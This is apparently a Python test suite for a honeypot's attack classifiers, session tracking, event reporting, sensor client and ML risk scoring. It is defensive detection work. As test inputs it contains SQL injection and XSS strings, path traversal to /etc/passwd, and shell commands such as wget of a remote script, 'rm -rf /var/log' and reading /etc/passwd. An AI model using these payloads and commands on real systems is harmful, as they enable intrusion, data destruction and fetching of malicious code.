"""
Tests for the honeypot -> backend connection (Step 3). Standard library + Flask only, so they run
without the backend stack. The ML integration tests use the real MLService.
"""
import json
import os
import tempfile
import threading
import unittest
import warnings
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from unittest.mock import patch

from honeypot.common.classifiers import classify_command, classify_http
from honeypot.common.demo_geo import demo_geo_for_ip
from honeypot.common.reporter import HoneypotReporter
from honeypot.common.sensor_client import SensorClient, load_env_file
from honeypot.common.sessionizer import Sessionizer


class FakeClock:
    def __init__(self, start=1000.0):
        self.now = start

    def __call__(self):
        return self.now

    def advance(self, seconds):
        self.now += seconds


class RecordingClient:
    """Stands in for SensorClient: records payloads instead of sending them."""
    enabled = True

    def __init__(self):
        self.payloads = []

    def send(self, payload):
        self.payloads.append(payload)
        return True


class StubBackend:
    """Tiny HTTP server that mimics /api/events/ingest with a configurable status code."""

    def __init__(self, status=200, expected_key="k"):
        self.status = status
        self.expected_key = expected_key
        self.received = []
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def do_POST(self):
                body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
                outer.received.append((self.path, dict(self.headers), body))
                self.send_response(outer.status)
                self.end_headers()
                self.wfile.write(b"{}")

        self.server = HTTPServer(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self.server.server_port}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def stop(self):
        self.server.shutdown()
        self.server.server_close()


class TestClassifiers(unittest.TestCase):

    def test_sql_injection_detected_even_when_url_encoded(self):
        event_type, tags, snippets = classify_http("GET", "/login", "user=admin'%20OR%20'1'='1", "", False)
        self.assertEqual(event_type, "HTTP_SQLI")
        self.assertIn("sqli", tags)
        self.assertTrue(snippets)

    def test_union_select_and_sleep_detected(self):
        self.assertEqual(classify_http("GET", "/t", "id=1 UNION SELECT user,pass FROM users", "", False)[0], "HTTP_SQLI")
        self.assertEqual(classify_http("GET", "/t", "id=1;SELECT SLEEP(5)", "", False)[0], "HTTP_SQLI")

    def test_xss_detected(self):
        self.assertEqual(classify_http("GET", "/s", "q=<script>alert(1)</script>", "", False)[0], "HTTP_XSS")

    def test_sensitive_file_and_traversal_are_unauthorized_downloads(self):
        self.assertEqual(classify_http("GET", "/.env", "", "", False)[0], "UNAUTHORIZED_DOWNLOAD")
        self.assertEqual(classify_http("GET", "/x", "f=../../etc/passwd", "", False)[0], "UNAUTHORIZED_DOWNLOAD")

    def test_login_attempt_scanner_bait_and_plain(self):
        self.assertEqual(classify_http("POST", "/login", "username=a", "curl/8", True)[0], "LOGIN_FAILED")
        self.assertEqual(classify_http("GET", "/", "", "Nikto/2.5", False)[0], "HTTP_SCAN")
        self.assertEqual(classify_http("GET", "/wp-login.php", "", "Mozilla/5.0", False)[0], "HTTP_PROBE")
        self.assertEqual(classify_http("GET", "/index.html", "", "Mozilla/5.0", False)[0], "HTTP_REQUEST")

    def test_injection_hidden_in_password_field_is_still_caught(self):
        event_type, _, snippets = classify_http("POST", "/login", "username=a ' OR 1=1 --", "", True)
        self.assertEqual(event_type, "HTTP_SQLI")

    def test_commands(self):
        self.assertEqual(classify_command("whoami"), ("HONEYPOT_COMMAND", "recon"))
        self.assertEqual(classify_command("wget http://x/m.sh")[0], "UNAUTHORIZED_DOWNLOAD")
        self.assertEqual(classify_command("rm -rf /var/log")[0], "FILE_DELETE")
        self.assertEqual(classify_command("cat /etc/passwd")[0], "PRIVILEGE_ESCALATION")
        self.assertEqual(classify_command("sudo ./run.sh")[0], "PRIVILEGE_ESCALATION")

    def test_oversized_input_is_bounded(self):
        # Must return promptly and not raise on huge attacker-controlled input.
        self.assertEqual(classify_http("GET", "/a", "A" * 500000, "", False)[0], "HTTP_REQUEST")


class TestSessionizer(unittest.TestCase):

    def setUp(self):
        self.clock = FakeClock()
        self.s = Sessionizer(idle_timeout=300, rapid_window=10, rapid_threshold=5, rapid_cooldown=60, clock=self.clock)

    def test_failed_logins_accumulate_per_ip_and_protocol(self):
        for _ in range(3):
            snap = self.s.record_login("1.1.1.1", "SSH", "root", False)
        self.assertEqual(snap["failed_count"], 3)
        self.assertEqual(self.s.record_login("2.2.2.2", "SSH", "root", False)["failed_count"], 1)
        self.assertEqual(self.s.record_request("1.1.1.1")["failed_count"], 0)  # HTTP session is separate

    def test_successful_login_does_not_increase_failures(self):
        self.s.record_login("1.1.1.1", "SSH", "a", False)
        self.assertEqual(self.s.record_login("1.1.1.1", "SSH", "a", True)["failed_count"], 1)

    def test_duration_and_commands(self):
        self.s.record_login("1.1.1.1", "SSH", "a", True)
        self.clock.advance(42)
        snap = self.s.record_command("1.1.1.1")
        self.assertEqual(snap["command_count"], 1)
        self.assertEqual(snap["session_duration"], 42.0)

    def test_session_resets_after_idle_timeout(self):
        self.s.record_login("1.1.1.1", "SSH", "a", False)
        self.clock.advance(301)
        self.assertEqual(self.s.record_login("1.1.1.1", "SSH", "a", False)["failed_count"], 1)

    def test_rapid_flag_fires_once_then_cools_down(self):
        flags = []
        for _ in range(8):
            flags.append(self.s.record_request("3.3.3.3")["rapid"])
            self.clock.advance(0.5)
        self.assertEqual(flags.count(True), 1)
        self.assertTrue(flags[4])  # fifth request within the window

    def test_slow_requests_never_flag_rapid(self):
        for _ in range(10):
            self.assertFalse(self.s.record_request("4.4.4.4")["rapid"])
            self.clock.advance(5)

    def test_memory_is_bounded(self):
        small = Sessionizer(max_sessions=3, clock=self.clock)
        for i in range(10):
            small.record_request(f"10.0.0.{i}")
        self.assertLessEqual(len(small._sessions), 3)


class TestDemoGeo(unittest.TestCase):

    def test_only_documentation_ranges_get_fake_geo(self):
        self.assertIsNotNone(demo_geo_for_ip("198.51.100.23"))
        self.assertIsNotNone(demo_geo_for_ip("203.0.113.5"))
        self.assertIsNone(demo_geo_for_ip("8.8.8.8"))
        self.assertIsNone(demo_geo_for_ip("not-an-ip"))

    def test_deterministic(self):
        self.assertEqual(demo_geo_for_ip("192.0.2.77"), demo_geo_for_ip("192.0.2.77"))


class TestReporterPayloads(unittest.TestCase):

    def setUp(self):
        self.client = RecordingClient()
        self.reporter = HoneypotReporter(self.client, Sessionizer(rapid_threshold=5), "t", demo_geo=False)

    def test_identity_and_geo_are_explicit_so_backend_defaults_never_apply(self):
        (payload,) = self.reporter.ssh_login("198.51.100.5", "root", False)
        self.assertEqual(payload["user_id"], "root")
        self.assertEqual(payload["device"], "honeypot-ssh")
        for key in ("source_country", "source_region", "source_city", "source_lat", "source_lng"):
            self.assertIn(key, payload)
            self.assertIsNone(payload[key])  # explicit null => backend GeoIP enrichment runs

    def test_demo_geo_marks_events_as_simulated(self):
        rep = HoneypotReporter(self.client, Sessionizer(), "t", demo_geo=True)
        (payload,) = rep.ssh_login("198.51.100.5", "root", False)
        self.assertTrue(payload["details"]["geo_simulated"])
        self.assertIsNotNone(payload["source_city"])

    def test_failed_count_is_cumulative_and_login_flags_set(self):
        for _ in range(4):
            (payload,) = self.reporter.ssh_login("198.51.100.5", "admin", False)
        d = payload["details"]
        self.assertEqual((payload["event_type"], d["failed_count"], d["protocol"]), ("LOGIN_FAILED", 4, "SSH"))
        self.assertIs(d["login_success"], False)

    def test_accepted_login_does_not_use_the_benign_login_success_name(self):
        (payload,) = self.reporter.ssh_login("198.51.100.5", "admin", True)
        self.assertEqual(payload["event_type"], "HONEYPOT_LOGIN_ACCEPTED")
        self.assertNotEqual(payload["event_type"], "LOGIN_SUCCESS")

    def test_password_never_in_payload_only_length(self):
        sent = self.reporter.http_request(
            "198.51.100.9", "POST", "/login", user_agent="curl/8", username="admin",
            password="SuperSecret123", body="username=admin", is_login_attempt=True,
        )
        text = json.dumps(sent)
        self.assertNotIn("SuperSecret123", text)
        self.assertEqual(sent[0]["details"]["password_length"], 14)

    def test_url_encoded_query_is_decoded_for_the_backend(self):
        (payload,) = self.reporter.http_request("198.51.100.9", "GET", "/t", query="id=1%20UNION%20SELECT%20a%20FROM%20b")
        self.assertIn("union select", payload["details"]["query"].lower())

    def test_injection_in_password_is_surfaced_without_leaking_the_password(self):
        sent = self.reporter.http_request(
            "198.51.100.9", "POST", "/login", username="a", password="x' OR 1=1 --", is_login_attempt=True,
        )
        self.assertEqual(sent[0]["event_type"], "HTTP_SQLI")
        self.assertNotIn("x' OR 1=1 --", json.dumps(sent))

    def test_request_burst_adds_a_rapid_access_event(self):
        events = []
        for _ in range(6):
            events.extend(self.reporter.http_request("198.51.100.9", "GET", "/admin", user_agent="Nikto"))
        self.assertEqual(sum(1 for e in events if e["event_type"] == "RAPID_RESOURCE_ACCESS"), 1)

    def test_attacker_text_is_sanitised(self):
        (payload,) = self.reporter.ssh_command("198.51.100.5", "ls\x00\x1b[31m" + "A" * 1000)
        self.assertLessEqual(len(payload["details"]["command"]), 200)
        self.assertNotIn("\x00", payload["details"]["command"])


class TestSensorClient(unittest.TestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def _client(self, url, key="k", **kw):
        return SensorClient(url, key, spool_path=self.tmp / "spool.jsonl", attempts=1, backoff=0,
                            timeout=2, replay_interval=3600, **kw)

    def test_sends_json_with_api_key_header(self):
        backend = StubBackend()
        client = self._client(backend.url)
        self.assertTrue(client.send({"event_type": "LOGIN_FAILED", "details": {}}))
        self.assertTrue(client.flush(5))
        client.close()
        backend.stop()
        path, headers, body = backend.received[0]
        self.assertEqual(path, "/api/events/ingest")
        # HTTP header names are case-insensitive (urllib sends "X-api-key"), so compare lower-cased.
        self.assertEqual({k.lower(): v for k, v in headers.items()}.get("x-api-key"), "k")
        self.assertEqual(body["event_type"], "LOGIN_FAILED")
        self.assertEqual(client.stats["sent"], 1)

    def test_disabled_without_key_never_touches_network(self):
        client = SensorClient("http://127.0.0.1:9", "", spool_path=self.tmp / "s.jsonl")
        self.assertFalse(client.enabled)
        self.assertFalse(client.send({"x": 1}))
        self.assertEqual(client.spool_size(), 0)

    def test_unreachable_backend_spools_then_replays(self):
        client = self._client("http://127.0.0.1:9")  # nothing listens on port 9
        client.send({"event_type": "A", "details": {}})
        client.send({"event_type": "B", "details": {}})
        client.flush(10)
        self.assertEqual(client.spool_size(), 2)

        backend = StubBackend()
        client.backend_url = backend.url
        self.assertEqual(client.replay_spool(), 2)
        self.assertEqual(client.spool_size(), 0)
        self.assertEqual([r[2]["event_type"] for r in backend.received], ["A", "B"])
        client.close()
        backend.stop()

    def test_rejected_key_is_spooled_not_dropped(self):
        backend = StubBackend(status=401)
        client = self._client(backend.url)
        client.send({"event_type": "A", "details": {}})
        client.flush(5)
        self.assertEqual(client.spool_size(), 1)
        self.assertEqual(len(backend.received), 1)  # one attempt, no retry storm
        client.close()
        backend.stop()

    def test_permanently_bad_payload_is_dropped_not_spooled_forever(self):
        backend = StubBackend(status=422)
        client = self._client(backend.url)
        client.send({"bad": True})
        client.flush(5)
        self.assertEqual(client.spool_size(), 0)
        self.assertEqual(client.stats["dropped"], 1)
        client.close()
        backend.stop()

    def test_close_spools_unsent_events(self):
        client = SensorClient("http://127.0.0.1:9", "k", spool_path=self.tmp / "spool.jsonl",
                              autostart=False)  # no worker: events stay queued
        client.send({"event_type": "Q", "details": {}})
        client.close()
        self.assertEqual(client.spool_size(), 1)


class TestEnvLoading(unittest.TestCase):

    def test_only_sensor_settings_are_read_from_dotenv(self):
        env_file = Path(tempfile.mkdtemp()) / ".env"
        env_file.write_text(
            "SECRET_KEY=must-not-leak\nSMTP_PASSWORD=must-not-leak\nDATABASE_URL=postgres://u:p@h/db\n"
            "SENTINEL_SENSOR_API_KEY=abc123  # comment\nHONEYPOT_HTTP_PORT='9090'\nSENTINELAI_BACKEND_URL=http://b:8000\n",
            encoding="utf-8",
        )
        with patch.dict(os.environ, {}, clear=False):
            for k in ("SECRET_KEY", "SMTP_PASSWORD", "DATABASE_URL", "SENTINEL_SENSOR_API_KEY",
                      "HONEYPOT_HTTP_PORT", "SENTINELAI_BACKEND_URL"):
                os.environ.pop(k, None)
            load_env_file(env_file)
            self.assertEqual(os.environ.get("SENTINEL_SENSOR_API_KEY"), "abc123")
            self.assertEqual(os.environ.get("HONEYPOT_HTTP_PORT"), "9090")
            self.assertEqual(os.environ.get("SENTINELAI_BACKEND_URL"), "http://b:8000")
            for secret in ("SECRET_KEY", "SMTP_PASSWORD", "DATABASE_URL"):
                self.assertNotIn(secret, os.environ)
            for k in ("SENTINEL_SENSOR_API_KEY", "HONEYPOT_HTTP_PORT", "SENTINELAI_BACKEND_URL"):
                os.environ.pop(k, None)


class TestHttpHoneypotApp(unittest.TestCase):

    def setUp(self):
        from honeypot.http.http_honeypot import create_app
        self.create_app = create_app
        self.tmp = Path(tempfile.mkdtemp())
        self.client = RecordingClient()
        self.reporter = HoneypotReporter(self.client, Sessionizer(), "t", demo_geo=False)

    def _app(self, trust_xff=False):
        return self.create_app(reporter=self.reporter, log_file=self.tmp / "http.json", trust_xff=trust_xff).test_client()

    def test_pages_and_unknown_paths(self):
        c = self._app()
        self.assertEqual(c.get("/").status_code, 200)
        self.assertEqual(c.get("/admin").status_code, 200)
        self.assertEqual(c.get("/definitely/not/here").status_code, 404)
        self.assertIn(b"decoy", c.get("/.env").data)

    def test_every_request_is_logged_locally_and_reported(self):
        c = self._app()
        c.get("/admin")
        c.get("/nope")
        records = json.loads((self.tmp / "http.json").read_text())
        self.assertEqual([r["request"] for r in records], ["/admin", "/nope"])
        self.assertEqual(len(self.client.payloads), 2)

    def test_login_attempt_stores_length_not_password(self):
        c = self._app()
        c.post("/login", data={"username": "admin", "password": "hunter2hunter2"})
        log_text = (self.tmp / "http.json").read_text()
        self.assertNotIn("hunter2hunter2", log_text)
        record = json.loads(log_text)[0]
        self.assertEqual((record["event"], record["login_success"], record["password_length"]),
                         ("login_attempt", False, 14))
        self.assertNotIn("hunter2hunter2", json.dumps(self.client.payloads))
        self.assertEqual(self.client.payloads[0]["event_type"], "LOGIN_FAILED")

    def test_login_never_succeeds_and_failures_accumulate(self):
        c = self._app()
        for i in range(12):
            c.post("/login", data={"username": "admin", "password": f"pw{i}"})
        self.assertEqual(self.client.payloads[-1]["details"]["failed_count"], 12)

    def test_forwarded_ip_is_ignored_unless_explicitly_trusted(self):
        self._app(trust_xff=False).get("/", headers={"X-Forwarded-For": "198.51.100.77"})
        self.assertNotEqual(self.client.payloads[-1]["source_ip"], "198.51.100.77")
        self._app(trust_xff=True).get("/", headers={"X-Forwarded-For": "198.51.100.77"})
        self.assertEqual(self.client.payloads[-1]["source_ip"], "198.51.100.77")

    def test_garbage_forwarded_header_falls_back_safely(self):
        self._app(trust_xff=True).get("/", headers={"X-Forwarded-For": "<script>"})
        self.assertNotEqual(self.client.payloads[-1]["source_ip"], "<script>")

    def test_reporting_failure_never_breaks_the_honeypot(self):
        class Boom:
            def http_request(self, **kwargs):
                raise RuntimeError("backend exploded")
        app = self.create_app(reporter=Boom(), log_file=self.tmp / "http.json", trust_xff=False)
        self.assertEqual(app.test_client().get("/admin").status_code, 200)


class TestMLIntegration(unittest.TestCase):
    """Sensor payloads scored by the real MLService, exactly as /api/events/ingest does."""

    @classmethod
    def setUpClass(cls):
        warnings.filterwarnings("ignore")
        from backend.app.services.ml_service import MLService
        cls.ml = MLService

    def _score(self, payload):
        details = dict(payload["details"])
        details.pop("risk_score", None)
        return self.ml.evaluate_event(payload["event_type"], None, details)

    def setUp(self):
        self.reporter = HoneypotReporter(RecordingClient(), Sessionizer(rapid_threshold=5), "t", demo_geo=False)

    def test_tenth_failed_ssh_login_is_critical(self):
        results = []
        for i in range(12):
            (p,) = self.reporter.ssh_login("198.51.100.23", "root", False)
            results.append(self._score(p))
        self.assertLess(results[0]["risk_score"], 40)
        self.assertEqual(results[9]["risk_level"], "Critical")
        self.assertEqual(results[11]["risk_score"], 99.05)

    def test_accepted_login_on_a_honeypot_is_high_risk(self):
        (p,) = self.reporter.ssh_login("203.0.113.45", "admin", True)
        result = self._score(p)
        self.assertGreaterEqual(result["risk_score"], 85.0)
        self.assertEqual(result["prediction"], -1)

    def test_sql_injection_variants_are_high_risk(self):
        for query in ("user=admin'%20OR%20'1'='1", "id=1%20UNION%20SELECT%20a%20FROM%20b",
                      "id=1;SELECT%20SLEEP(5)", "q=%27;DROP%20TABLE%20users;--"):
            (p,) = self.reporter.http_request("198.51.100.91", "GET", "/test", query=query, user_agent="sqlmap")
            self.assertGreaterEqual(self._score(p)["risk_score"], 85.0, query)

    def test_xss_is_high_risk(self):
        (p,) = self.reporter.http_request("198.51.100.91", "GET", "/s", query="q=%3Cscript%3Ealert(1)%3C/script%3E")
        self.assertGreaterEqual(self._score(p)["risk_score"], 85.0)

    def test_post_compromise_commands_rank_above_recon(self):
        recon = self._score(self.reporter.ssh_command("203.0.113.45", "whoami")[0])["risk_score"]
        download = self._score(self.reporter.ssh_command("203.0.113.45", "wget http://x/m.sh")[0])["risk_score"]
        privesc = self._score(self.reporter.ssh_command("203.0.113.45", "sudo ./m.sh")[0])["risk_score"]
        self.assertLess(recon, download)
        self.assertLess(recon, privesc)

    def test_request_burst_scores_medium_or_higher(self):
        burst = None
        for _ in range(6):
            for e in self.reporter.http_request("192.0.2.77", "GET", "/login", user_agent="Nikto"):
                if e["event_type"] == "RAPID_RESOURCE_ACCESS":
                    burst = e
        self.assertIsNotNone(burst)
        self.assertGreaterEqual(self._score(burst)["risk_score"], 40.0)

    def test_ordinary_request_stays_low(self):
        (p,) = self.reporter.http_request("198.51.100.200", "GET", "/", user_agent="Mozilla/5.0")
        self.assertLess(self._score(p)["risk_score"], 40.0)


if __name__ == "__main__":
    unittest.main()
